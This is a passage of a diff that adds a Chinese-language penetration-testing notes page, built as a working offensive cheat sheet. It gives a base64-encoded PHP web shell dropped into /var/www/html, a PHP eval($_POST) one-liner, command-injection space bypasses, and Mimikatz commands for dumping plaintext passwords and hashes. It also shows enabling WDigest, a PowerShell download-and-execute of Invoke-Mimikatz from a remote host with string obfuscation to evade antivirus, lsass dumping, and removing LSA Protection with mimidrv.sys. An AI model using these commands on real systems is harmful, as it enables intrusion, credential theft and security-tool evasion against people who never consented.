+<p><code>set /p="123123"</code>：这个部分将字符串 "123123" 存储到一个无名的变量中。</p>
+<p><code>&gt;&gt;1we.txt</code>：这部分将前面的字符串追加到文件 "1we.txt" 中。&gt;&gt; 是追加重定向操作符，它会在文件的末尾添加内容而不覆盖原有的内容。</p>
+</blockquote>
+<h2 id="_6">规避空格<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p>如果无法输入空格.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>echo.123&gt;&gt;a.txt
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>echo,123&gt;&gt;a.txt
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>type;a.txt
+</code></pre></div>
+<p><img alt="截图" src="4b66af17651d3a984d5f02ab7b2278e8.png" /></p>
+<h2 id="certutil">写特殊字符很多的文件，可以用certutil编码再还原<a class="headerlink" href="#certutil" title="Permanent link">&para;</a></h2>
+<p>如下还原：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>certutil -f -decode 111.txt C:\\111.jsp
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>certutil -decodehex 111.txt C:\\111.jsp
+</code></pre></div>
+<p><img alt="截图" src="5a84853856a488f374ef83b879093e8f.png" /></p>
+<blockquote>
+<p><code>certutil -f -decode 111.txt C:\\111.jsp</code>：这个命令会对名为 "111.txt" 的文件进行解码，并将解码后的内容保存到名为 "C:\111.jsp" 的文件中。-f 标志表示强制覆盖目标文件（如果存在的话）。这个命令的作用是将 "111.txt" 文件的内容进行解码，并将结果保存到 "C:\111.jsp" 文件中。</p>
+<p><code>certutil -decodehex 111.txt C:\\111.jsp</code>：这个命令也是对名为 "111.txt" 的文件进行解码操作，不过它使用了 -decodehex 参数，这表示要求解码器将输入文件视为十六进制格式进行解码。然后，解码后的内容会被保存到 "C:\111.jsp" 文件中。</p>
+<p>这两个命令的区别在于解码器对待输入文件的方式：第一个命令默认将输入文件视为 <strong>Base64</strong> 编码的文本文件进行解码，而第二个命令将输入文件视为<strong>十六进制</strong>格式的数据进行解码。</p>
+</blockquote>
+<h2 id="linuxbase64">linux下base64<a class="headerlink" href="#linuxbase64" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php
+</code></pre></div>
+<p><img alt="截图" src="6567639c3f17e2ecb37d343e59ed3b47.png" /></p>
+<h2 id="php">php的<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>echo \&lt;\?php eval\(\@\$_POST\[1\]\)\; \?\&gt; &gt;1.php
+</code></pre></div>
+<h2 id="_7">绕过空格<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&gt; &lt; &lt;&gt; 重定向符
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>%09(需要php环境)
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>${IFS}
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>$IFS$9
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>{cat,flag.php}
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>%20
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>%09
+</code></pre></div>
+<h1 id="windows_1">windows打包目录<a class="headerlink" href="#windows_1" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>powershell -Command &quot;Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip&quot;
+</code></pre></div>
+<p><img alt="截图" src="80f64d47fbfe9d8b93a748081afc102f.png" /></p>
+<blockquote>
+<p><code>powershell</code>：这是命令行中启动 PowerShell 的关键词。</p>
+<p><code>-Command</code>：这个标志告诉 PowerShell 解释器，后面的字符串是一个要执行的 PowerShell 命令。</p>
+<p><code>"Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"</code>：这个字符串是要执行的 PowerShell 命令。它调用了 Compress-Archive cmdlet，并传递了两个参数：</p>
+<ul>
+<li>
+<p><code>-Path E:\update\</code>：这是要压缩的文件或文件夹的路径。在这个例子中，路径是 E 盘下的 update 文件夹。</p>
+</li>
+<li>
+<p><code>-DestinationPath E:\test.zip</code>：这是压缩后的归档文件的保存路径和文件名。在这个例子中，归档文件将保存在 E 盘的根目录下，并命名为 test.zip。</p>
+</li>
+</ul>
+<p>因此，这个命令的作用是将 E 盘下的 update 文件夹中的内容压缩成一个名为 test.zip 的 Zip 归档文件，该文件将保存在 E 盘的根目录下。</p>
+</blockquote>
+<h1 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h1>
+<p>mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证。 https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919</p>
+<h2 id="_8">一条命令<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit
+</code></pre></div>
+<p><img alt="截图" src="85efd4e14143523e0910361061ea3bfa.png" /></p>
+<blockquote>
+<p>提升权限 <code>privilege::debug</code> : 通过debug获得mimikatz程序的特殊操作,调试权限允许某人调试他们本来无法访问的进程。例如，作为用户运行的进程在其令牌上启用了调试权限，可以调试作为本地系统运行的服务。</p>
+<p>抓取明文密码 <code>sekurlsa::logonpasswords</code>: 在windows2012以上的系统不能直接获取明文密码了，需要配置相关注册表等操作。</p>
+</blockquote>
+<h2 id="log">控制台执行多条命令，用log防止进程崩溃，数据丢失<a class="headerlink" href="#log" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>mimikatz # privilege::debug
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>mimikatz # log
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>mimikatz # sekurlsa::logonpasswords
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>mimikatz # sekurlsa::wdigest
+</code></pre></div>
+<blockquote>
+<p>tspkg，wdigest，kerberos：这个就是账户对应的明文密码了。有的时候这三个对应的也不是全部都是一样的，需要看服务器是什么角色。</p>
+</blockquote>
+<h2 id="msf">msf中执行命令<a class="headerlink" href="#msf" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>mimikatz_command -f sekurlsa::logonPasswords full
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>mimikatz_command -f sekurlsa::wdigest
+</code></pre></div>
+<h2 id="wdigest08r22016">注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。<a class="headerlink" href="#wdigest08r22016" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>REG_DWORD /f /d 1
+</code></pre></div>
+<h2 id="mimikatz_1">绕过杀软执行mimikatz<a class="headerlink" href="#mimikatz_1" title="Permanent link">&para;</a></h2>
+<h3 id="powershell">powershell<a class="headerlink" href="#powershell" title="Permanent link">&para;</a></h3>
+<p><code>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</code></p>
+<p>cmd下执行</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>C:\Users\test\Desktop&gt;powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot;
+</code></pre></div>
+<blockquote>
+<p>这个命令启动 PowerShell，然后通过 -exec bypass 参数绕过了 PowerShell 的执行策略（Execution Policy），允许执行未签名的脚本。然后，命令执行了以下操作：</p>
+<p><code>import-module .\Invoke-Mimikatz.ps1</code>：这个命令会导入当前目录下的名为 "Invoke-Mimikatz.ps1" 的 PowerShell 脚本文件。这个脚本通常用于执行 Mimikatz 工具中的功能，Mimikatz 是一个知名的密码抓取工具，常用于渗透测试和安全评估。</p>
+<p><code>Invoke-Mimikatz</code>：一旦 "Invoke-Mimikatz.ps1" 被导入，这个命令会执行该脚本中的 Invoke-Mimikatz 函数或命令。这通常会触发 Mimikatz 工具的执行，从而执行相关的操作，例如提取系统中的凭据信息。</p>
+<p>总的来说，这个命令旨在执行一个 PowerShell 脚本（Invoke-Mimikatz.ps1），以执行 Mimikatz 工具中的相关功能。</p>
+</blockquote>
+<p>也可以远程加载</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz
+</code></pre></div>
+<blockquote>
+<p><code>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-Mimikatz.ps1');</code>：这个部分利用 PowerShell 的 IEX （Invoke-Expression）命令，执行了从指定 URL 下载的 PowerShell 脚本。具体来说：</p>
+<p><code>(New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-Mimikatz.ps1')</code> 这部分使用 Net.WebClient 对象下载了位于指定 URL 的 PowerShell 脚本的内容。
+IEX 命令将下载的脚本内容作为字符串执行，相当于在当前 PowerShell 会话中直接执行了从网络下载的脚本内容。
+Invoke-Mimikatz：一旦远程脚本被下载并执行，这个命令会调用脚本中的 Invoke-Mimikatz 函数或命令。这通常会触发 Mimikatz 工具的执行，从而执行相关的操作，例如提取系统中的凭据信息。</p>
+<p>总的来说，这个命令旨在通过远程下载的方式执行一个 PowerShell 脚本（Invoke-Mimikatz.ps1），以执行 Mimikatz 工具中的相关功能。</p>
+</blockquote>
+<p>但是powershell被360拦截</p>
+<p><img alt="截图" src="a652d36507188d106e859f1ed19c154b.png" /></p>
+<p>简单混淆就bypass了</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>powershell -c &quot; (&#39;IEX &#39;+&#39;(Ne&#39;+&#39;w-O&#39;+&#39;bject Ne&#39;+&#39;t.W&#39;+&#39;ebClien&#39;+&#39;t).Do&#39;+&#39;wnloadS&#39;+&#39;trin&#39;+&#39;g&#39;+&#39;(&#39;+&#39;1vchttp://&#39;+&#39;192.168.0&#39;+&#39;.101/&#39;+&#39;Inv&#39;+&#39;oke-Mimik&#39;+&#39;a&#39;+&#39;tz.&#39;+&#39;ps11v&#39;+&#39;c)&#39;+&#39;;&#39;+&#39;I&#39;+&#39;nvoke-Mimika&#39;+&#39;tz&#39;).REplaCE(&#39;1vc&#39;,[STRing][CHAR]39)|IeX&quot;
+</code></pre></div>
+<h3 id="lsass">导出lsass进程离线读密码<a class="headerlink" href="#lsass" title="Permanent link">&para;</a></h3>
+<p>1.安装procdump64.exe</p>
+<p><code>https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</code></p>
+<p>2.从procdump64.exe里导出1.dmp</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>procdump64.exe -accepteula -ma lsass.exe 1.dmp
+</code></pre></div>
+<p>也可以在任务管理器中操作</p>
+<p><img alt="截图" src="17da9933f09c578b629e2cd173818d03.png" /></p>
+<p>3.然后将1.dmp下载到本地</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>mimikatz_2.1_64.exe &quot;sekurlsa::minidump 1.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
+</code></pre></div>
+<p><img alt="截图" src="43d77c54b705d5bb95b8605d7d8d971d.png" /></p>
+<h2 id="bypass-lsa-protection">Bypass LSA Protection<a class="headerlink" href="#bypass-lsa-protection" title="Permanent link">&para;</a></h2>
+<p>在渗透过程中，获得一台windows机器权限之后，很重要一个环节就是抓密码。 但是在使用mimikatz抓取系统账号密码时，有时运维人员会开启一些防护措施，导致mimikatz抓取失败或异常。 下面主要介绍bypass LSA Protection获取密码。</p>
+<blockquote>
+<p>LSA（Local Security Authority）保护是一项Windows安全功能，旨在提高系统的安全性，特别是针对LSASS（Local Security Authority Subsystem Service）进程的保护。</p>
+<p>LSASS 是负责验证用户登录信息、分配安全令牌以及执行身份验证和授权操作的关键系统进程。由于其关键性，LSASS 成为了黑客攻击的目标之一。攻击者可能尝试通过各种手段获取 LSASS 进程的访问权限，以执行恶意活动，例如获取用户凭据或执行提权攻击。</p>
+<p>为了增强对 LSASS 进程的保护，Windows 引入了 LSA 保护功能。LSA 保护通过将 LSASS 进程标记为受保护进程，并限制对其内存和数据的访问，以防止未经授权的访问或恶意操作。LSA 保护还可以与其他安全功能结合使用，例如 Credential Guard 和 Device Guard，以提供更全面的安全性。</p>
+</blockquote>
+<p>自Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 <strong>在LSA Protection保护模式下，mimikatz运行 sekurlsa::logonpasswords抓取密码会报错。</strong></p>
+<p>查询是否启用：<code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code></p>
+<h3 id="1-lsa-protection">1.开启 LSA Protection<a class="headerlink" href="#1-lsa-protection" title="Permanent link">&para;</a></h3>
+<p>测试环境：Windows 10 X64</p>
+<p>可以通过注册表开启LSA Protection，注册表位置：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code> 新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，然后重启系统生效。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;RunAsPPL&quot; /t REG_DWORD /d &quot;00000001&quot; /f
+</code></pre></div>
+<blockquote>
+<p>用于在 Windows 注册表中添加一个键值，其作用是设置系统中的“RunAsPPL”参数。具体而言：</p>
+<ul>
+<li>
+<p>HKLM\SYSTEM\CurrentControlSet\Control\Lsa 是注册表中的一个键路径，它指向 Windows 系统的 LSA（Local Security Authority）子系统设置。</p>
+</li>
+<li>
+<p>/v "RunAsPPL" 指定要添加或修改的值名称，这里是“RunAsPPL”。</p>
+</li>
+<li>
+<p>/t REG_DWORD 表示值的数据类型是 DWORD（双字）。</p>
+</li>
+<li>
+<p>/d "00000001" 指定要设置的 DWORD 值的数据。在这里，值被设置为 1，这意味着启用了“RunAsPPL”功能。</p>
+</li>
+<li>
+<p>/f 标志表示强制执行，即使已存在同名的键或值也要进行操作。</p>
+</li>
+</ul>
+<p>“RunAsPPL” 是 Windows 中的一项安全设置，用于启用 Protected Process Light （PPL）特性，这是一种提高系统安全性的功能。启用后，这些进程会以更高的权限级别运行，以增强系统的安全性。</p>
+</blockquote>
+<p><img alt="截图" src="d452e5b8afd49686f6bcdf4b8e132ff5.png" /></p>
+<p>验证LSA是否以保护模式启动，查看系统日志，事件id为12-LSASS.exe作为受保护的进程启动：</p>
+<p><img alt="截图" src="50610e4f84d18765749f08104948467a.png" /></p>
+<h3 id="2lsa-protectionsekurlsalogonpasswords">2.LSA Protection运行下的sekurlsa::logonpasswords<a class="headerlink" href="#2lsa-protectionsekurlsalogonpasswords" title="Permanent link">&para;</a></h3>
+<p>在开启LSA Protection时，mimikatz运行 sekurlsa::logonpasswords会报错 “ERROR kuhl_m_sekurlsa_acquireLSA；Handle on memery”</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>mimikatz # privilege::debug
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>mimikatz # sekurlsa::logonpasswords
+</code></pre></div>
+<p><img alt="截图" src="85ec8ab50e1bc510fc75399e57894747.png" /></p>
+<h3 id="3lsadumpsam-bypass">3.lsadump::sam   bypass<a class="headerlink" href="#3lsadumpsam-bypass" title="Permanent link">&para;</a></h3>
+<p>mimikatz 运行 lsadump :: sam 从磁盘上的SAM读取凭据，可成功pypass LSA Protection，读取到用户哈希</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>mimikatz # privilege::debug
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>mimikatz # token::whoami
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>mimikatz # token::elevate
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>mimikatz # lsadump::sam
+</code></pre></div>
+<p><img alt="截图" src="6d197141fd0602ce1e63131a3bcab3b3.png" /></p>
+<h3 id="4mimidrvsys-bypass">4.mimidrv.sys   bypass<a class="headerlink" href="#4mimidrvsys-bypass" title="Permanent link">&para;</a></h3>
+<p>mimikatz其中的mimidrv.sys驱动程序，可从lsass.exe进程中删除LSA保护，成功bypass LSA Protection。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>mimikatz # privilege::debug
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>mimikatz # !+
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>mimikatz # !processprotect /process:lsass.exe /remove
+</code></pre></div>
+<p><img alt="截图" src="a065b45395a2f3a8ee51405b76adf251.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../javascripts/extra.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
